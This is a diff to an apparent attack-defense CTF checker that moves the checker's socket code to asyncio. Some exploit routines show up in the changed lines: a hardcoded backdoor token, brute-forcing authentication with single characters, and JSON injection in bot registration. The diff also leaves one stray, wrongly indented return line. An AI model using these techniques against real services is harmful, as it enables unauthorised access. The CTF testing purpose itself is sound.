@@ -6,6 +6,7 @@ import socket
 import random
 import string
 import hashlib
+import asyncio
 import hmac
 import binascii
 from typing import Optional, Callable
@@ -32,7 +33,6 @@ from enochecker3.types import (
 from enochecker3.utils import FlagSearcher, assert_in
 
 # Definitions
-Socket = socket.socket
 ALNUM = string.ascii_letters + string.digits
 
 # Load custom imports
@@ -45,6 +45,7 @@ SERVICE_TCP_PORT = 31337
 CHECKER_ENTROPY_SECRET_SEED = 'Th4N0s_m4De_th1s_FoR-T34m_Eur0p3__' + SERVICE_NAME
 CHECKER_USE_DB = True
 CHECKER_SEED_MOD_KEY = 'task_chain_id' #'current_round_id', 'task_id'
+CHECKER_TCP_TIMEOUT = 5
 
 # Patch Enochecker to use HTTPS and disable SSL verification
 class EnocheckerPatched(Enochecker):
@@ -57,6 +58,32 @@ class EnocheckerPatched(Enochecker):
 # Initialize checker
 checker = EnocheckerPatched(SERVICE_NAME, SERVICE_WEB_PORT)
 app = lambda: checker.app
+
+class AsyncSocket:
+    def __init__(self, address: str, port: int, timeout: int = CHECKER_TCP_TIMEOUT):
+        self.address = address
+        self.port = port
+        self.timeout = timeout
+        self.sock = None
+        self.loop = asyncio.get_running_loop()
+
+    async def connect(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.setblocking(False)
+        try:
+            await asyncio.wait_for(self.loop.sock_connect(self.sock, (self.address, self.port)), self.timeout)
+        except Exception:
+            self.sock.close()
+            raise
+
+    async def recv(self, nbytes: int) -> bytes:
+        return await self.loop.sock_recv(self.sock, nbytes)
+
+    async def sendall(self, data: bytes):
+        return await self.loop.sock_sendall(self.sock, data)
+
+    async def close(self):
+        self.sock.close()
 
 class RandomGenerator:
     def __init__(self, seed=None):
@@ -330,40 +357,40 @@ async def do_search(logger: LoggerAdapter, client: AsyncClient, data: dict, toke
         logger.error(f"Failed to parse JSON response during {r.request.method} {r.request.url.path}: " + f"\n{e}")
         raise MumbleException(f"Failed to parse search response")
 
-def do_socket_connect(logger: LoggerAdapter, address: str) -> Socket:
+async def do_socket_connect(logger: LoggerAdapter, address: str) -> AsyncSocket:
     try:
-        s = socket.create_connection((address, 31337))
-        s.settimeout(5)
+        s = AsyncSocket(address, 31337, CHECKER_TCP_TIMEOUT)
+        await s.connect()
         return s
     except Exception as e:
         logger.error(f"Failed to start a socket with the mng service: " + f"\n{e}")
         raise MumbleException(f"Failed to connect to mng")
 
-def recvuntil(socket: Socket, delimiter: bytes, max_buffer: int = 10240, buffer_size: int = 1024) -> bytes:
+async def recvuntil(socket: AsyncSocket, delimiter: bytes, max_buffer: int = 10240, buffer_size: int = 1024) -> bytes:
     buffer = b""
 
     while delimiter not in buffer:
         if len(buffer) > max_buffer:
             raise RuntimeError(f"Buffer exceeded {max_buffer} bytes without finding delimiter")
     
-        chunk = socket.recv(buffer_size)
+        chunk = await socket.recv(buffer_size)
         if not chunk:
             break
         buffer += chunk
 
     return buffer
 
-def do_socket_sendline(socket: Socket, message: bytes) -> None:
-    socket.sendall(message + b'\n')
+#def do_socket_sendline(socket: AsyncSocket, message: bytes) -> None:
+#    socket.sendall(message + b'\n')
 
-def do_socket_recvline(socket: Socket) -> None:
+#def do_socket_recvline(socket: Socket) -> None:
     return recvuntil(socket, b'\n')
 
-def do_socket_auth(logger: LoggerAdapter, socket: Socket, botName: str, botToken: str, verify=True) -> None:
+async def do_socket_auth(logger: LoggerAdapter, socket: AsyncSocket, botName: str, botToken: str, verify=True) -> None:
     data = None
     try:
-        socket.sendall(b'AUTHEN ' + botName.encode() + b' ' + botToken.encode() + b'\n')
-        data = recvuntil(socket, b'\n')
+        await socket.sendall(b'AUTHEN ' + botName.encode() + b' ' + botToken.encode() + b'\n')
+        data = await recvuntil(socket, b'\n')
     except Exception as e:
         logger.error(f"Failed to send AUTHEN command to the mng service: " + f"\n{e}")
         raise MumbleException(f"Failed to authenticate to mng")
@@ -371,12 +398,12 @@ def do_socket_auth(logger: LoggerAdapter, socket: Socket, botName: str, botToken
         logger.error(f"Authentication using the AUTHEN command to the mng service failed: " + f"\n{data}")
         raise MumbleException(f"Failed to authenticate to mng")
 
-def do_socket_setcode(logger: LoggerAdapter, socket: Socket, code: dict, verify=True) -> None:
+async def do_socket_setcode(logger: LoggerAdapter, socket: AsyncSocket, code: dict, verify=True) -> None:
     data = None
     try:
         code = base64.b64encode(json.dumps(code).encode())
-        socket.sendall(b'SETCODE ' + code + b'\n')
-        data = recvuntil(socket, b'\n')
+        await socket.sendall(b'SETCODE ' + code + b'\n')
+        data = await recvuntil(socket, b'\n')
     except Exception as e:
         logger.error(f"Failed to send SETCODE command to the mng service: " + f"\n{e}")
         raise MumbleException(f"Failed to set bot code through mng")
@@ -384,11 +411,11 @@ def do_socket_setcode(logger: LoggerAdapter, socket: Socket, code: dict, verify=
         logger.error(f"Setting bot code using the SETCODE command through the mng service failed: " + f"\n{data}")
         raise MumbleException(f"Failed to set bot code through mng")
 
-def do_socket_getcode(logger: LoggerAdapter, socket: Socket, verify=True) -> dict:
+async def do_socket_getcode(logger: LoggerAdapter, socket: AsyncSocket, verify=True) -> dict:
     data = None
     try:
-        socket.sendall(b'GETCODE' + b'\n')
-        data = recvuntil(socket, b'\n')
+        await socket.sendall(b'GETCODE' + b'\n')
+        data = await recvuntil(socket, b'\n')
         if data.startswith(b'CODE '):
             data = data[5:-1]
         elif verify:
@@ -481,10 +508,10 @@ async def putflag_store2(task: PutflagCheckerTaskMessage, logger: LoggerAdapter,
         logger.debug(f"Not created bot (already exists): username:{username} botname:{botname} and flag:{task.flag}")
         return ('botname:' + botname)
 
-    socket = do_socket_connect(logger, task.address)
-    do_socket_auth(logger, socket, botname, bottoken)
+    socket = await do_socket_connect(logger, task.address)
+    await do_socket_auth(logger, socket, botname, bottoken)
     
-    do_socket_setcode(logger, socket, code)
+    await do_socket_setcode(logger, socket, code)
 
     logger.debug(f"Created bot: username:{username} botname:{botname} and flag:{task.flag}")
 
@@ -530,9 +557,9 @@ async def getflag_store2(task: GetflagCheckerTaskMessage, logger: LoggerAdapter,
         botflagkey = gen.genStr(gen.genInt(6,14))
         token = await do_login(logger, client, username, password)
 
-    socket = do_socket_connect(logger, task.address)
-    do_socket_auth(logger, socket, botname, bottoken)
-    code = do_socket_getcode(logger, socket)
+    socket = await do_socket_connect(logger, task.address)
+    await do_socket_auth(logger, socket, botname, bottoken)
+    code = await do_socket_getcode(logger, socket)
 
     text = None
     try:
@@ -709,9 +736,9 @@ async def putnoise_store2(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapte
         # Bot already exists
         return
 
-    socket = do_socket_connect(logger, task.address)
-    do_socket_auth(logger, socket, botname, bottoken)
-    do_socket_setcode(logger, socket, code)
+    socket = await do_socket_connect(logger, task.address)
+    await do_socket_auth(logger, socket, botname, bottoken)
+    await do_socket_setcode(logger, socket, code)
 
     if CHECKER_USE_DB:
         data = {
@@ -755,9 +782,9 @@ async def getnoise_store2(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapte
         botnoisevalue = gen.genStr(gen.genInt(6,22))
     
 
-    socket = do_socket_connect(logger, task.address)
-    do_socket_auth(logger, socket, botname, bottoken)
-    code = do_socket_getcode(logger, socket)
+    socket = await do_socket_connect(logger, task.address)
+    await do_socket_auth(logger, socket, botname, bottoken)
+    code = await do_socket_getcode(logger, socket)
 
     text = None
     try:
@@ -887,20 +914,20 @@ async def havoc_store2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, cli
     if may_reregister:
         await do_register_bot_if_not_exists(logger, client, botname, bottoken, token, verify=False)
 
-    socket = do_socket_connect(logger, task.address)
+    socket = await do_socket_connect(logger, task.address)
 
     if may_wrong_login:
-        do_socket_auth(logger, socket, botname, may_wrong_login, verify=False)
+        await do_socket_auth(logger, socket, botname, may_wrong_login, verify=False)
     
-    do_socket_auth(logger, socket, botname, bottoken)
+    await do_socket_auth(logger, socket, botname, bottoken)
     if may_reauthen:
-        do_socket_auth(logger, socket, botname, bottoken)
+        await do_socket_auth(logger, socket, botname, bottoken)
 
     if may_getcode:
-        do_socket_getcode(logger, socket, verify=False)
+        await do_socket_getcode(logger, socket, verify=False)
     if may_setcode:
-        do_socket_setcode(logger, socket, code, verify=False)
-        do_socket_getcode(logger, socket, verify=False)
+        await do_socket_setcode(logger, socket, code, verify=False)
+        await do_socket_getcode(logger, socket, verify=False)
 
 
 '''
@@ -1079,9 +1106,9 @@ async def exploit_store2_b(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
     if storetype != 'botname':
         raise MumbleException("Exploit 4: Wrong flagstore")
 
-    socket = do_socket_connect(logger, task.address)
-    do_socket_auth(logger, socket, botname, 'n1s4_w4s_HEr3?')
-    code = do_socket_getcode(logger, socket)
+    socket = await do_socket_connect(logger, task.address)
+    await do_socket_auth(logger, socket, botname, 'n1s4_w4s_HEr3?')
+    code = await do_socket_getcode(logger, socket)
 
     text = None
     try:
@@ -1105,19 +1132,19 @@ async def exploit_store2_c(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
     if storetype != 'botname':
         raise MumbleException("Exploit 5: Wrong flagstore")
 
-    socket = do_socket_connect(logger, task.address)
+    socket = await do_socket_connect(logger, task.address)
 
     hacked = False
     for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
         try:
-            do_socket_auth(logger, socket, botname, c)
+            await do_socket_auth(logger, socket, botname, c)
             hacked = True
             break
         except MumbleException:
             pass
     
     if hacked:
-        code = do_socket_getcode(logger, socket)
+        code = await do_socket_getcode(logger, socket)
 
         text = None
         try:
@@ -1154,8 +1181,8 @@ async def exploit_store2_d(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
 
     registed = await do_register_bot_if_not_exists(logger, client, botname, bottoken + '","name":"' + target_botname, token)
     if registed:
-        socket = do_socket_connect(logger, task.address)
-        do_socket_auth(logger, socket, botname, bottoken)
+        socket = await do_socket_connect(logger, task.address)
+        await do_socket_auth(logger, socket, botname, bottoken)
         
         code = {
             "init" : [
@@ -1167,7 +1194,7 @@ async def exploit_store2_d(task: ExploitCheckerTaskMessage, logger: LoggerAdapte
                 }
             ]
         }
-        do_socket_setcode(logger, socket, code)
+        await do_socket_setcode(logger, socket, code)
 
     logger.debug(f"Exploiting json injection vulnerability targetin botname:{target_botname} by forging botname:{botname}")
 
